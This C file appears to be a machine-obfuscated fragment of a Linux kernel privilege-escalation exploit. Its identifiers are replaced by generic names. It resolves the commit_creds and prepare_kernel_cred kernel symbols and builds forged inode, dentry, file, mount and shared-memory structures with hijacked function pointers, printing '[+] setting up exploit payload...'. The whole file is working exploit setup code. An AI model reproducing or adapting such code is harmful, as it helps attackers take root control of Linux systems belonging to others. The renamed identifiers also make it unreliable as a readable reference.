
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_22__ TYPE_9__ ;
typedef struct TYPE_21__ TYPE_8__ ;
typedef struct TYPE_20__ TYPE_7__ ;
typedef struct TYPE_19__ TYPE_6__ ;
typedef struct TYPE_18__ TYPE_5__ ;
typedef struct TYPE_17__ TYPE_4__ ;
typedef struct TYPE_16__ TYPE_3__ ;
typedef struct TYPE_15__ TYPE_2__ ;
typedef struct TYPE_14__ TYPE_1__ ;
typedef struct TYPE_13__ TYPE_11__ ;
typedef struct TYPE_12__ TYPE_10__ ;


typedef scalar_t__ _prepare_kernel_cred ;
typedef scalar_t__ _commit_creds ;
struct TYPE_15__ {int count; } ;
struct TYPE_14__ {struct TYPE_14__* prev; struct TYPE_14__* next; } ;
struct TYPE_22__ {int i_size; TYPE_2__ inotify_mutex; TYPE_1__ inotify_watches; TYPE_6__* i_sb; } ;
struct TYPE_21__ {int * get_unmapped_area; int * mmap; } ;
struct TYPE_17__ {int mode; void* cgid; void* cuid; void* gid; void* uid; int key; } ;
struct TYPE_20__ {TYPE_10__* shm_file; TYPE_4__ shm_perm; } ;
struct TYPE_19__ {scalar_t__ s_flags; } ;
struct TYPE_18__ {int mnt_count; scalar_t__ mnt_flags; } ;
struct TYPE_16__ {struct TYPE_16__* next; struct TYPE_16__* prev; } ;
struct TYPE_13__ {int d_count; int d_flags; TYPE_9__* d_inode; int * d_parent; } ;
struct TYPE_12__ {TYPE_8__* f_op; TYPE_5__* f_vfsmnt; TYPE_11__* f_dentry; TYPE_3__ fu_list; } ;


 int VAR_0 ;
 scalar_t__ VAR_1 ;
 TYPE_11__ VAR_2 ;
 TYPE_10__ VAR_3 ;
 scalar_t__ FUNC_0 (char*) ;
 void* FUNC_1 () ;
 void* FUNC_2 () ;
 TYPE_9__ VAR_4 ;
 int VAR_5 ;
 TYPE_8__ VAR_6 ;
 scalar_t__ VAR_7 ;
 int FUNC_3 (char*) ;
 TYPE_7__ VAR_8 ;
 TYPE_6__ VAR_9 ;
 TYPE_5__ VAR_10 ;

void
FUNC_4(void)
{
 FUNC_3("[+] looking for symbols...\n");

 VAR_1 = (_commit_creds) FUNC_0("commit_creds");
 if (!VAR_1) {
  FUNC_3("[-] symbol table not availabe, aborting!\n");
 }

 VAR_7 = (_prepare_kernel_cred) FUNC_0("prepare_kernel_cred");
 if (!VAR_7) {
  FUNC_3("[-] symbol table not availabe, aborting!\n");
 }

 FUNC_3("[+] setting up exploit payload...\n");

 VAR_9.s_flags = 0;

 VAR_4.i_size = 4096;
 VAR_4.i_sb = &VAR_9;
 VAR_4.inotify_watches.next = &VAR_4.inotify_watches;
 VAR_4.inotify_watches.prev = &VAR_4.inotify_watches;
 VAR_4.inotify_mutex.count = 1;

 VAR_2.d_count = 4096;
 VAR_2.d_flags = 4096;
 VAR_2.d_parent = ((void*)0);
 VAR_2.d_inode = &VAR_4;

 VAR_6.mmap = &VAR_5;
 VAR_6.get_unmapped_area = &VAR_5;

 VAR_10.mnt_flags = 0;
 VAR_10.mnt_count = 1;

 VAR_3.fu_list.prev = &VAR_3.fu_list;
 VAR_3.fu_list.next = &VAR_3.fu_list;
 VAR_3.f_dentry = &VAR_2;
 VAR_3.f_vfsmnt = &VAR_10;
 VAR_3.f_op = &VAR_6;

 VAR_8.shm_perm.key = VAR_0;
 VAR_8.shm_perm.uid = FUNC_2();
 VAR_8.shm_perm.gid = FUNC_1();
 VAR_8.shm_perm.cuid = FUNC_2();
 VAR_8.shm_perm.cgid = FUNC_1();
 VAR_8.shm_perm.mode = -1;
 VAR_8.shm_file = &VAR_3;
}
